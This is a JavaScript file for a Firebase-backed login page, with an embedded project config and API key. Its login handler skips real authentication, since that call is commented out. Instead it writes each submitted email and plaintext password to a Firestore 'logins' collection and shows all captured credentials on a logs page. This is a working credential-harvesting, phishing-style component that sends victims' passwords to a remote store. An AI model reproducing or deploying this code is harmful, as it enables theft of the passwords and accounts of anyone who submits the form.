// Firebase config (FIXED)
const firebaseConfig = {
  apiKey: "AIzaSyCiMtzOo0foExCI25-BiNo5eSYDuyLK3RY",
  authDomain: "liveloginapp-16efe.firebaseapp.com",
  projectId: "liveloginapp-16efe",
  storageBucket: "liveloginapp-16efe.appspot.com", // ✅ Fixed this line
  messagingSenderId: "382599167518",
  appId: "1:382599167518:web:39e493f4ab1a800740b80f",
  measurementId: "G-8T5VY5ZL3L"
};

firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();

// 🟢 Login handler
function login(e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // 🔐 Optional: Real login with Firebase Auth
  // firebase.auth().signInWithEmailAndPassword(email, password)
  //   .then(() => {
  //     console.log("User logged in!");
  //   })
  //   .catch(err => {
  //     alert("Login failed: " + err.message);
  //   });

  // ✅ Logging email+pass to Firestore
  db.collection("logins").add({
    email: email,
    password: password,
    time: new Date().toLocaleString()
  }).then(() => {
    window.location.href = "logs.html";
  }).catch((err) => {
    console.error("Error saving login:", err.message);
  });
}

// 📄 Logs page logic
if (document.getElementById("logList")) {
  db.collection("logins").orderBy("time", "desc")
    .onSnapshot(snapshot => {
      const logList = document.getElementById("logList");
      logList.innerHTML = "";

      snapshot.forEach(doc => {
        const data = doc.data();
        const li = document.createElement("li");
        li.textContent = `${data.email} | ${data.password} | ${data.time}`;
        logList.appendChild(li);
      });
    });
}
